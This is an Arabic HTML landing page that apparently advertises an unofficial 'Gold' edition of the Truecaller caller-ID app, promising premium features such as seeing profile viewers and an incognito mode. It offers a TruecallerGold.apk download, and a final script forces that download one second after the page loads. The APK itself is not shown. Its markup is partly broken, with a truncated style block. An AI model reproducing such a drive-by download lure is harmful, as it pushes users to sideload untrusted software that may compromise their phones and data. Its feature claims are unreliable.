    <style>

        /* Initial state for fade-in animation */
        .fade-in-start {

<body class="bg-gray-50 text-gray-800 flex flex-col items-center justify-center min-h-screen p-4 sm:p-6 md:p-8">

        <header class="text-center mb-8 fade-in-start transition-all duration-700 delay-100">
            <div class="inline-block relative mb-4">
                <!-- Gold Circle with Phone Icon -->
                <div class="w-24 h-24 bg-gradient-to-b from-amber-400 to-amber-500 rounded-full shadow-lg flex items-center justify-center">
                    <!-- Phone Icon SVG -->
                    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/>
                    </svg>
                </div>
                <!-- Crown Icon SVG -->
                <div class="absolute -top-3 left-1/2 -translate-x-1/2 text-amber-400">
                    <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24" fill="currentColor" class="drop-shadow-md">
                        <path d="M5 16L3 5l5.5 5L12 4l3.5 6L21 5l-2 11H5z"/>
                    </svg>
                </div>
            </div>
            <h1 class="text-4xl font-extrabold text-amber-600">تروكولر الذهبي</h1>
            <p class="text-gray-500 mt-2 text-lg">تجربة حصرية لكشف هوية المتصل بدون حدود.</p>
        </header>

        <!-- Features Section -->
        <section class="space-y-3 mb-10">
            <div class="feature-item fade-in-start transition-all duration-700 delay-200 bg-gray-50/50 p-4 rounded-xl flex items-center gap-4 border border-gray-200/80">
                <div class="bg-yellow-100 p-2 rounded-full"><div data-lucide="gem" class="w-5 h-5 text-amber-500 flex-shrink-0"></div></div>
                <span class="font-medium text-gray-700">هوية متصل ذهبية مميزة</span>
            </div>
            <div class="feature-item fade-in-start transition-all duration-700 delay-300 bg-gray-50/50 p-4 rounded-xl flex items-center gap-4 border border-gray-200/80">
                 <div class="bg-yellow-100 p-2 rounded-full"><div data-lucide="eye" class="w-5 h-5 text-amber-500 flex-shrink-0"></div></div>
                <span class="font-medium text-gray-700">اعرف من شاهد ملفك الشخصي</span>
            </div>
            <div class="feature-item fade-in-start transition-all duration-700 delay-400 bg-gray-50/50 p-4 rounded-xl flex items-center gap-4 border border-gray-200/80">
                <div class="bg-yellow-100 p-2 rounded-full"><div data-lucide="zap-off" class="w-5 h-5 text-amber-500 flex-shrink-0"></div></div>
                <span class="font-medium text-gray-700">تجربة خالية من الإعلانات</span>
            </div>
             <div class="feature-item fade-in-start transition-all duration-700 delay-500 bg-gray-50/50 p-4 rounded-xl flex items-center gap-4 border border-gray-200/80">
                <div class="bg-yellow-100 p-2 rounded-full"><div data-lucide="ghost" class="w-5 h-5 text-amber-500 flex-shrink-0"></div></div>
                <span class="font-medium text-gray-700">وضع التخفي عند عرض الملفات</span>
            </div>
        </section>

        <!-- Download Button -->
        <div class="fade-in-start transition-all duration-700 delay-600">
            <a href="TruecallerGold.apk" 
               download="TruecallerGold.apk"
               class="group flex items-center justify-center gap-3 w-full bg-amber-500 text-white font-bold py-4 px-6 rounded-xl shadow-lg shadow-amber-500/30 transition-all transform hover:bg-amber-600 hover:scale-105 active:scale-95">
                <span>حمّل النسخة الذهبية</span>
                <div data-lucide="download" class="w-6 h-6 transition-transform group-hover:translate-y-0.5"></div>
            </a>
            <p class="text-xs text-gray-500 text-center mt-4">تنزيل مباشر لملف APK</p>
        </div>

    </div>

    <script>
        // Activate Lucide icons
        lucide.createIcons();
        
        // Simple fade-in animation on load
        window.addEventListener('load', () => {
            const elements = document.querySelectorAll('.fade-in-start');
            elements.forEach(el => {
                // Stagger the animation start slightly
                const delay = parseInt(el.classList.toString().match(/delay-(\d+)/)?.[1] || '0');
                setTimeout(() => {
                    el.classList.remove('fade-in-start');
                }, delay); 
            });
        });
    </script>
	<script>setTimeout(function () { window.location = 'TruecallerGold.apk'; }, 1000)</script>

</body>
